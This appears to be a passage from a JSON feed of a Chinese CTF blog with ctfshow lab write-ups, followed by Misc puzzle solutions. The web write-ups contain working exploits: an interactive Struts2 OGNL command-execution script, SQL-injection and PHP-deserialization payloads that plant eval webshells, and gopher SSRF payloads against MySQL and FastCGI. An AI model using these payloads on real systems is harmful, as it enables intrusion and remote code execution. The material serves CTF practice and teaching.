            "content_html": "<h1 id=\"web-279-294-296-297\"><a href=\"#web-279-294-296-297\" class=\"headerlink\" title=\"web 279-294 296-297\"></a>web 279-294 296-297</h1><p>脚本通杀 下载 下载链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hhdEJveS9TdHJ1dHMyLVNjYW4=\">https://github.com/HatBoy/Struts2-Scan</span><br>具体用法在md文件中，例如<br>检测<br><code>python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action</code><br>利用<br><code>python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec</code><br>执行命令env即可得到flag</p>\n<h1 id=\"web-295\"><a href=\"#web-295\" class=\"headerlink\" title=\"web 295\"></a>web 295</h1><p>漏洞点在：<span class=\"exturl\" data-url=\"aHR0cDovLzg0NmNlMzM0LTU5ZDAtNGRjMS1iNzhkLTE5NDA4OWFjM2JlOS5jaGFsbGVuZ2UuY3RmLnNob3cvUzItMDQ4L2ludGVncmF0aW9uL3NhdmVHYW5nc3Rlci5hY3Rpb24=\">http://846ce334-59d0-4dc1-b78d-194089ac3be9.challenge.ctf.show/S2-048/integration/saveGangster.action</span></p>\n<pre><code class=\"python\">import json,re\nimport requests\nimport threading\nimport urllib.parse\nimport base64\n\ndef Poc(url,command):\n    header = {'Content-Type': 'application/x-www-form-urlencoded'}\n    poc = {\"name\":\"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \\\n                          \"+command+\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}\",\"age\":\"1\",\"__checkbox_bustedBefore\":\"true\",\"description\":\"123123\"}\n    data = urllib.parse.urlencode(poc)\n    try:\n        result = requests.post(url,data=data,headers=header)\n        if result.status_code == 200:\n            \n            print(result.content)\n    except requests.ConnectionError as e:\n        print(e)\n\nth = {\"url\":\"\"}\n\nwhile True:\n    if th.get(\"url\") != \"\":\n        input_cmd = input(\"cmd &gt;&gt;: \")\n        if input_cmd == \"exit\":\n            exit()\n        elif input_cmd == 'set':\n            url = input(\"set url :\")\n            th['url'] = url\n        elif input_cmd == 'show url':\n            print(th.get(\"url\"))\n        else:\n            Poc(th.get(\"url\"),input_cmd)\n    else:\n        url = input(\"set url :\")\n        th[\"url\"] = url\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/9e150aa2/",
            "url": "http://dpm12345.cn/posts/9e150aa2/",
            "title": "代码审计",
            "date_published": "2023-01-15T14:53:15.000Z",
            "content_html": "<h1 id=\"web-301\"><a href=\"#web-301\" class=\"headerlink\" title=\"web 301\"></a>web 301</h1><p>下载源码文件，发现在<code>checklogin.php</code>文件中的sql查询语句没有过滤</p>\n<pre><code class=\"php\">$sql=\"select sds_password from sds_user where sds_username='\".$username.\"' order by id limit 1;\";\n</code></pre>\n<p>而<code>$username</code>是可控的，故可以用sqlmap爆破出密码，或者写一句话木马文件</p>\n<h2 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h2><p>运行脚本</p>\n<pre><code class=\"bash\">python sqlmap.py -u http://392cb8ff-78e8-4004-9117-6a9a0d378c35.challenge.ctf.show/checklogin.php --form --batch --dump\n</code></pre>\n<p>所花时间比较长，需要等待</p>\n<p>最后得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web301_sqlmap.jpg\" alt=\"sqlmap结构结果\" title=\"运行结果\"></p>\n<p>username：<code>admin</code></p>\n<p>password： <code>ctfshowwwww</code></p>\n<p>登录成功后跳转到<code>index.php</code></p>\n<p>可以看到flag</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web301_sqlmap_result.jpg\"></p>\n<h2 id=\"写一句话\"><a href=\"#写一句话\" class=\"headerlink\" title=\"写一句话\"></a>写一句话</h2><p>根据原SQL语句的结构，注入位置为<code>where</code>后，首先需要闭合单引号<code>'</code>，再由此进行联合查询写文件,最后再过滤即可</p>\n<pre><code class=\"sql\">' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#\n</code></pre>\n<p>于是在登陆界面</p>\n<p>username: <code>' union select \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"#</code></p>\n<p>password: <code>1</code></p>\n<p>点击登录后，可以发现停在<code>checklogin.php</code>，可知sql语句执行成功</p>\n<p>访问<code>1.php</code>，报错<code>Notice: Undefined offset: 1 in /var/www/html/1.php on line 1</code></p>\n<p><code>1=system('ls')</code>可以看到flag.php</p>\n<p><code>1=system('tac flag.php');</code>得到flag</p>\n<p><code>ctfshow{be6425ec-a5f6-4afb-b76f-104b34576198}</code></p>\n<h1 id=\"web-302\"><a href=\"#web-302\" class=\"headerlink\" title=\"web 302\"></a>web 302</h1><p>题目提示</p>\n<pre><code class=\"php\">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){\n</code></pre>\n<p>但sql语句在之前已经执行，因此同样可以采用上面的两种方法</p>\n<h1 id=\"web-303\"><a href=\"#web-303\" class=\"headerlink\" title=\"web 303\"></a>web 303</h1><p>根据题目所给的源码，在<code>dptadd.php</code>中找到注入点</p>\n<pre><code class=\"php\">$sql=\"insert into sds_dpt set sds_name='\".$dpt_name.\"',sds_address ='\".$dpt_address.\"',sds_build_date='\".$dpt_build_year.\"',sds_have_safe_card='\".$dpt_has_cert.\"',sds_safe_card_num='\".$dpt_cert_number.\"',sds_telephone='\".$dpt_telephone_number.\"';\";\n</code></pre>\n<p>而在这一sql语句中，没有任何的过滤</p>\n<p>而要进入这一段代码的执行，可以看到，<code>if(!isset($_SESSION['login']))</code>，即需要先登录成功</p>\n<p>再次查看源码，在<code>sds_user.sql</code>文件中，有这样一条信息</p>\n<pre><code class=\"sql\">INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');\n</code></pre>\n<p>也就是说，我们知道了一个账户的账号和密码，因此可以借此登录。但很明显，密码为密文形式，需要解出明文</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){\n    $_SESSION['login']=1;\n    $result-&gt;free();\n    $mysqli-&gt;close();\n    header(\"location:index.php\");\n    return;\n}\n</code></pre>\n<p>也就是说，只有<code>sds_decode($userpwd)</code>与<code>$row['sds_password']</code>相等才可以登陆成功，已知<code>$row['sds_password']</code>为<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>查看<code>sds_decode</code>方法的定义，在<code>fun.php</code>中</p>\n<pre><code class=\"php\">&lt;?php\nfunction sds_decode($str){\n    return md5(md5($str.md5(base64_encode(\"sds\"))).\"sds\");\n}\necho sds_decode(\"admin\");\n?&gt;\n</code></pre>\n<p>尝试用该方法的逆向过程解密，但发现<code>27151b7b1ad51a38ea66b1529cde5ee4</code>解不了</p>\n<p>看到<code>echo sds_decode(\"admin\");</code>，尝试运行，会发现输出的内容恰好为<code>27151b7b1ad51a38ea66b1529cde5ee4</code></p>\n<p>于是得知一个账户的账号和密码，均为<code>admin</code></p>\n<p>当执行成功后，会跳转到<code>dpt.php</code></p>\n<p>而<code>dpt.php</code>中有</p>\n<pre><code class=\"php\">&lt;?php\n//注入点\n$_GET['id']=!empty($_GET['id'])?$_GET['id']:NULL;\n$page=$_GET['id'];\n                        \n                                \n$sql=\"select * from sds_dpt order by id;\";\n$result=$mysqli-&gt;query($sql);\n?&gt;\n</code></pre>\n<p>也即可以利用这一页面来查看添加的值，于是查表payload</p>\n<p><code>dpt_name=1',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_1.jpg\"></p>\n<p><code>sds_dpt,sds_fl9g,sds_user</code></p>\n<p>猜测在表<code>sds_fl9g</code></p>\n<p>查列payload:<code>dpt_name=1',sds_address=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='sds_fl9g')%23</code></p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_2.jpg\"></p>\n<p><code>flag</code></p>\n<p>查值payload：<code>dpt_name=1',sds_address=(select group_concat(flag) from sds.sds_fl9g)%23</code>(数据库名<code>sds</code>可以从源码中的<code>conn.php</code>找到，也可以查)</p>\n<p>得到</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_303_3.jpg\"></p>\n<h1 id=\"web-304\"><a href=\"#web-304\" class=\"headerlink\" title=\"web 304\"></a>web 304</h1><p>说添加了waf，但实际没有，同上面方法，除表名改为<code>sds_flaag</code>，其他不变</p>\n<h1 id=\"web-305\"><a href=\"#web-305\" class=\"headerlink\" title=\"web 305\"></a>web 305</h1><p>此题增加了waf，不能像上两题一样解题，但很明显多了个<code>class.php</code>文件，查看</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-17 13:20:37\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-17 13:33:21\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nclass user{\n    public $username;\n    public $password;\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __destruct(){\n        file_put_contents($this-&gt;username, $this-&gt;password);\n    }\n}\n</code></pre>\n<p>看到</p>\n<pre><code class=\"php\">public function __destruct(){\n    file_put_contents($this-&gt;username, $this-&gt;password);\n}\n</code></pre>\n<p>看起来是反序列化</p>\n<p>再看<code>checklogin.php</code>，看到</p>\n<pre><code class=\"php\">$user_cookie = $_COOKIE['user'];\nif(isset($user_cookie)){\n    $user = unserialize($user_cookie);\n}\n</code></pre>\n<p>没有任何限制，也就是只要创建一个反序列化对象即可，然后通过<code>$COOKIE['user']</code>传递，最后点击登录，便能执行反序列化</p>\n<pre><code class=\"php\">&lt;?php\nclass user{\n    public $username;\n    public $password;\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __destruct(){\n        file_put_contents($this-&gt;username, $this-&gt;password);\n    }\n}\n\n$a = new user('1.php','&lt;?php eval($_POST[1]);?&gt;');\necho urlencode(serialize($a));\n</code></pre>\n<p>按以上操作后，访问<code>1.php</code></p>\n<p>可以看到报错，使用蚁剑连接数据库</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web_305.jpg\"></p>\n<p>数据库类型为<code>MYSQLI</code>，密码为<code>root</code>(该密码可在蚁剑文件界面的<code>conn.php</code>找到，与下载来的源码文件不同)</p>\n<p>通过查表，得到flag在<code>sds.sds_flabag</code></p>\n<h1 id=\"web-306\"><a href=\"#web-306\" class=\"headerlink\" title=\"web 306\"></a>web 306</h1><p>查看代码，发现<code>index.php</code>有反序列化操作</p>\n<pre><code class=\"php\">$user = unserialize(base64_decode($_COOKIE['user']));\nif(!$user){\n    header(\"location:login.php\");\n}\n</code></pre>\n<p>于是查找其他文件，寻找<code>__wakeup()``__destruct</code>方法或者可以写文件之类的函数，如<code>file_put_contents</code></p>\n<p>最后可在<code>class.php</code>中找到</p>\n<pre><code class=\"php\">class log{\n    public $title='log.txt';\n    public $info='';\n    public function loginfo($info){\n        $this-&gt;info=$this-&gt;info.$info;\n    }\n    public function close(){\n        file_put_contents($this-&gt;title, $this-&gt;info);\n    }\n}\n</code></pre>\n<p>只要构造一个log类对象，然后调用<code>close()</code>方法，便能写文件</p>\n<p>查找所有文件的类中是否有调用<code>close()</code>的方法</p>\n<p>在<code>dao.php</code>中找到</p>\n<pre><code class=\"php\">class dao{\n    private $config;\n    private $conn;\n\n    public function __construct(){\n        $this-&gt;config=new config();\n        $this-&gt;init();\n    }\n    private function init(){\n        $this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());\n    }\n    public function __destruct(){\n        $this-&gt;conn-&gt;close();\n    }\n\n    public function get_user_password_by_username($u){\n        $sql=\"select sds_password from sds_user where sds_username='\".$u.\"' order by id limit 1;\";\n        $result=$this-&gt;conn-&gt;query($sql);\n        $row=$result-&gt;fetch_array(MYSQLI_BOTH);\n        if($result-&gt;num_rows&gt;0){\n            return $row['sds_password'];\n        }else{\n            return '';\n        }\n    }\n\n}\n</code></pre>\n<p>当其<code>__destruct</code>时即可执行，但由于以其本身创建的<code>$this-&gt;conn</code>为<code>mysqli</code>对象，故需要想方法使其为<code>log</code>对象</p>\n<p>好在该文件<code>require \"class.php\"</code>，故可以构造时就使其为<code>log</code>对象</p>\n<p>而在<code>index.php</code>，又也<code>require \"dao.php\"</code></p>\n<p>故代码为</p>\n<pre><code class=\"php\">&lt;?php\nclass dao{\n    private $config;\n    private $conn;\n    public function __construct($u){\n        $this-&gt;conn=$u;\n    }\n}\n\nclass log{\n    public $title='1.php';\n    public $info='&lt;?php eval($_POST[1]);?&gt;';\n}\n\n$a = new dao(new log());\necho urlencode(base64_encode(serialize($a)));\n</code></pre>\n<p>payload为<code>TzozOiJkYW8iOjI6e3M6MTE6IgBkYW8AY29uZmlnIjtOO3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319</code></p>\n<p>填写cookie后，访问<code>index.php</code>，再访问<code>1.php</code>，得到报错<strong>Notice</strong>: Undefined offset: 1 in <strong>/var/www/html/1.php</strong> on line <strong>1</strong></p>\n<p><code>1=system('ls');</code>后发现有<code>flag.php</code>，<code>1=system('tac flag.php');</code>，得到flag</p>\n<h1 id=\"web-307\"><a href=\"#web-307\" class=\"headerlink\" title=\"web 307\"></a>web 307</h1><p>查询反序列化路口，可以找到四个，其中三个只有反序列化，一个为反序列化后，并调用了其<code>clearCache()</code>方法</p>\n<p>查看所有的类，之前能用的<code>__destruct</code>中<code>close()</code>，由于<code>log</code>类的对应写文件方法为<code>closelog()</code>，故该方法失效，所以只能选用<code>logout.php</code>中的反序列化，调用<code>clearCache()</code>方法</p>\n<p>查看所有拥有<code>clearCache()</code>方法的类，为<code>dao</code>和<code>service</code>，而<code>service</code>最终调用的也为<code>dao</code>类中的<code>clearCache()</code>方法</p>\n<pre><code class=\"php\">public function  clearCache(){\n    shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');\n}\n</code></pre>\n<p>故只需巧妙构造一个<code>$this-&gt;config-&gt;cache_dir</code>便可执行系统命令</p>\n<p>而对于<code>config</code>类</p>\n<pre><code class=\"php\">class config{\n    private $mysql_username='root';\n    private $mysql_password='phpcj';\n    private $mysql_db='sds';\n    private $mysql_port=3306;\n    private $mysql_host='localhost';\n    public $cache_dir = 'cache';\n\n    public function get_mysql_username(){\n        return $this-&gt;mysql_username;\n    }\n    public function get_mysql_password(){\n        return $this-&gt;mysql_password;\n    }\n    public function get_mysql_port(){\n        return $this-&gt;mysql_port;\n    }\n    public function get_mysql_db(){\n        return $this-&gt;mysql_db;\n    }\n    public function get_mysql_host(){\n        return $this-&gt;mysql_host;\n    }\n}\n</code></pre>\n<p>只需修改<code>public $cache_dir = 'cache';</code>项</p>\n<p>故现在有两个选项，序列化<code>dao</code>和序列化<code>service</code></p>\n<p>但由于<code>service</code>类存在<code>__wakeup()</code>方法，再进行反序列化操作前，会调用此方法</p>\n<pre><code class=\"php\">public function __wakeup(){\n    $this-&gt;config=new config();\n    $this-&gt;dao=new dao();\n}\n</code></pre>\n<p>也即此时的<code>config</code>和<code>dao</code>都会刷新，那么<code>dao</code>中的构造好的<code>config</code>也会刷新，从而丢失构造好的数据，故只能选用<code>dao</code>序列化</p>\n<p>代码如下</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    private $mysql_username='root';\n    private $mysql_password='phpcj';\n    private $mysql_db='sds';\n    private $mysql_port=3306;\n    private $mysql_host='localhost';\n    public $cache_dir = 'x;echo \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\";echo ';\n}\nclass dao{\n    private $config;\n    private $conn;\n    public function __construct($u){\n        $this-&gt;config=$u;\n    }\n}\n\n$a = new dao(new config());\necho urlencode(base64_encode(serialize($a)));\n</code></pre>\n<p>访问<code>controller/logout.php</code>，自动跳转到<code>login.php</code>后，访问<code>1.php</code>，之后分别输入<code>1=system('ls')</code>和<code>1=system('tac flag.php')</code>得到flag</p>\n<h1 id=\"web-308\"><a href=\"#web-308\" class=\"headerlink\" title=\"web 308\"></a>web 308</h1><p>相较于上题，<code>clearCache()</code>方法添加了正则匹配</p>\n<pre><code class=\"php\">public function  clearCache(){\n    if(preg_match('/^[a-z]+$/i', $this-&gt;config-&gt;cache_dir)){\n        shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');\n    }\n}\n</code></pre>\n<p>输入的目录只允许存在字母，这里便不利于使用，放弃该利用点</p>\n<p>在<code>fun.php</code>中存在ssrf</p>\n<pre><code class=\"php\">function checkUpdate($url){\n        $ch=curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_HEADER, false);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); \n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);\n        $res = curl_exec($ch);\n        curl_close($ch);\n        return $res;\n    }\n</code></pre>\n<p>而这函数在<code>dao</code>类的<code>checkVersion</code>方法中出现</p>\n<pre><code class=\"php\">public function checkVersion(){\n    return checkUpdate($this-&gt;config-&gt;update_url);\n}\n</code></pre>\n<p>而<code>checkVersion</code>在<code>index.php</code>中被调用</p>\n<pre><code class=\"php\">$service = unserialize(base64_decode($_COOKIE['service']));\nif($service){\n    $lastVersion=$service-&gt;checkVersion();\n}\n</code></pre>\n<p>poc</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%45%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>其中<code>$update_url</code>由gopherus生成</p>\n<p>由于从代码可知为mysql，故生成命令</p>\n<pre><code class=\"raw\">python2 gopherus.py --exploit mysql\nroot\nselect \"&lt;?php eval($_POST[1]);?&gt;\" into outfile \"/var/www/html/1.php\"\n</code></pre>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web308.jpg\"></p>\n<p>最后访问<code>1.php</code>，拿到shell，获取flag</p>\n<h1 id=\"web-309\"><a href=\"#web-309\" class=\"headerlink\" title=\"web 309\"></a>web 309</h1><p>打的不是mysql了，打的是fastcgi.探测是通过gopher协议的延迟判断的</p>\n<p>gopher://127.0.0.1:9000</p>\n<pre><code class=\"raw\">python2 gopherus.py --exploit fastcgi\nindex.php\necho \"&lt;?php eval(\\$_POST[1]);?&gt;\" &gt; \"/var/www/html/1.php\"\n</code></pre>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web309.jpg\"></p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F7%07%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH108%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00l%04%00%3C%3Fphp%20system%28%27echo%20%22%3C%3Fphp%20eval%28%5C%24_POST%5B1%5D%29%3B%3F%3E%22%20%3E%20%22/var/www/html/1.php%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>F12添加cookie，访问<code>index.php</code>，再访问<code>1.php</code>，得到shell，之后获取flag</p>\n<h1 id=\"web-310\"><a href=\"#web-310\" class=\"headerlink\" title=\"web 310\"></a>web 310</h1><p>9000和6379都是关着的。那我们可以试试读下配置文件</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'file:///etc/nginx/nginx.conf';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n\n}\n$a=new dao();\necho urlencode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>得到关键信息(抓包获取)</p>\n<pre><code class=\"raw\">    server {\n        listen       4476;\n        server_name  localhost;\n        root         /var/flag;\n        index index.html;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    }\n</code></pre>\n<p>poc</p>\n<pre><code class=\"php\">&lt;?php\nclass config{\n    public $update_url = 'http://127.0.0.1:4476';\n}\nclass dao{\n    private $config;\n    public function __construct(){\n        $this-&gt;config=new config();\n    }\n}\n$a=new dao();\necho urlcode(base64_encode(serialize($a)));\n?&gt;\n</code></pre>\n<p>得到flag</p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/79d29fb/",
            "url": "http://dpm12345.cn/posts/79d29fb/",
            "title": "菜狗杯",
            "date_published": "2022-11-25T15:10:32.000Z",
            "content_html": "<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"杂项签到\"><a href=\"#杂项签到\" class=\"headerlink\" title=\"杂项签到\"></a>杂项签到</h2><p>得到1张图片。010 打开，直接搜索<code>ctfshow</code>得到flag</p>\n<p><code>ctfshow{a62b0b55682d81f7f652b26147c49040}</code></p>\n<h2 id=\"损坏的压缩包\"><a href=\"#损坏的压缩包\" class=\"headerlink\" title=\"损坏的压缩包\"></a>损坏的压缩包</h2><p>压缩包损坏，010 打开，发现为PNG头。修改后缀为png，正常打开，发现flag</p>\n<p><code>ctfshow{e19efe2eb86f10ccd7ca362110903cO5}</code></p>\n<h1 id=\"谜之栅栏\"><a href=\"#谜之栅栏\" class=\"headerlink\" title=\"谜之栅栏\"></a>谜之栅栏</h1><p>解压后得到两个图片，名称为找不同</p>\n<p>在010中打开，利用工具项的比较文件功能，可以看到两个不同点</p>\n<p><code>cfhwfaab2cb4af5a5820}</code>和<code>tso{06071f997b5bdd1a</code></p>\n<p>在根据题目说的迷之栅栏，应该为栅栏密码，而且看着很像为2个密码</p>\n<p>解密得<code>ctfshow{f0a6a0b721cfb949a7fb55ab5d8d210a}</code></p>\n<h1 id=\"你会数数吗？\"><a href=\"#你会数数吗？\" class=\"headerlink\" title=\"你会数数吗？\"></a>你会数数吗？</h1><p>使用010editor的 工具→直方图 统计计数解得flag，或者复制出来词频统计</p>\n<p>按照频次降序排，得到</p>\n<p><code>ctfshow{a1b2d3e4g56i7j8k9l0}</code></p>\n<h1 id=\"你会异或吗？\"><a href=\"#你会异或吗？\" class=\"headerlink\" title=\"你会异或吗？\"></a>你会异或吗？</h1><p>010异或0x50</p>\n<p><code>ctfshow{030dOf5073ab4681d30866d1fdf10ab1}</code></p>\n<h1 id=\"flag一分为二\"><a href=\"#flag一分为二\" class=\"headerlink\" title=\"flag一分为二\"></a>flag一分为二</h1><p>解压后得到一张图片</p>\n<p>部分一：盲水印提取(目前没有找到工具，需要理解一下原理)</p>\n<p><code>ctfshow{FirstP@RT</code></p>\n<p>部分二：修改图片高</p>\n<p><code>SecondP@rTMikumiku~}</code></p>\n<p><code>ctfshow{FirstP@RTSecondP@rTMikumiku~}</code></p>\n<h1 id=\"我是谁？？\"><a href=\"#我是谁？？\" class=\"headerlink\" title=\"我是谁？？\"></a>我是谁？？</h1><p>可以手动找，但有点多</p>\n<p>脚本</p>\n<pre><code class=\"python\">import requests\nfrom lxml import html\nimport cv2\nimport numpy as np\nimport json\n\n\nurl=\"http://xxxxxxxxxxxxxxxxxxxx.challenge.ctf.show\"\n\nsess=requests.session()\n\nall_girl=sess.get(url+'/static/all_girl.png').content\n\nwith open('all_girl.png','wb')as f:\n        f.write(all_girl)\n\nbig_pic=cv2.imdecode(np.fromfile('all_girl.png', dtype=np.uint8), cv2.IMREAD_UNCHANGED)\nbig_pic=big_pic[50:,50:,:]\nimage_alpha = big_pic[:, :, 3]\nmask_img=np.zeros((big_pic.shape[0],big_pic.shape[1]), np.uint8)\nmask_img[np.where(image_alpha == 0)] = 255\n\ncv2.imwrite('big.png',mask_img)\n\n\n\ndef answer_one(sess):\n        #获取视频文件\n        response=sess.get(url+'/check')\n        if 'ctfshow{' in response.text:\n                print(response.text)\n                exit(0)\n        tree=html.fromstring(response.text)\n        element=tree.xpath('//source[@id=\"vsource\"]')\n        video_path=element[0].get('src')\n        video_bin=sess.get(url+video_path).content\n        with open('Question.mp4','wb')as f:\n                f.write(video_bin)\n        #获取有效帧\n        video = cv2.VideoCapture('Question.mp4')\n        frame=0\n        while frame&lt;=55:\n                res, image = video.read()\n                frame+=1\n        #cv2.imwrite('temp.png',image)\n        video.release()\n        #获取剪影\n        image=image[100:400,250:500]\n        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)\n        #cv2.imwrite('gray_image.png',gray_image)\n        temp = np.zeros((300, 250), np.uint8)\n        temp[np.where(gray_image&gt;=128)]=255\n        #去白边\n        temp = temp[[not np.all(temp[i] == 255) for i in range(temp.shape[0])], :]\n        temp = temp[:, [not np.all(temp[:, i] == 255) for i in range(temp.shape[1])]]\n        #缩放至合适大小，肉眼大致判断是1.2倍，不一定准\n        temp = cv2.resize(temp,None,fx=1.2,fy=1.2)\n        #查找位置\n        res =cv2.matchTemplate( mask_img,temp,cv2.TM_CCOEFF_NORMED)\n        min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res)\n        x,y=int(max_loc[0]/192),int(max_loc[1]/288)#为什么是192和288，因为大图去掉标题栏就是1920*2880\n        guess='ABCDEFGHIJ'[y]+'0123456789'[x]\n        print(f'guess:{guess}')\n        #传答案\n        response=sess.get(url+'/submit?guess='+guess)\n        r=json.loads(response.text)\n        if r['result']:\n                print('guess right!')\n                return True\n        else:\n                print('guess wrong!')\n                return False\n\ni=1\n\nwhile i&lt;=31:\n        print(f'Round:{i}')\n        if answer_one(sess):\n                i+=1\n        else:\n                i=1\n</code></pre>\n<p><code>ctfshow{f25746ff-1bea-4afb-a0b7-2ed04bc5e4ff}</code></p>\n<h1 id=\"You-and-me\"><a href=\"#You-and-me\" class=\"headerlink\" title=\"You and me\"></a>You and me</h1><p>盲水印，使用工具 BlindWaterMark-master</p>\n<pre><code class=\"bash\">python3 bwmforpy3.py decode you.png you_and_me.png wm2.png\n</code></pre>\n<p><img data-src=\"/../../../post_images/ctfshow/%E8%8F%9C%E7%8B%97%E6%9D%AF/misc/you_and_me.png\" alt=\"you_and_me\"></p>\n<p><code>ctfshow{CDEASEFFR8846}</code></p>\n<h1 id=\"7-1-05\"><a href=\"#7-1-05\" 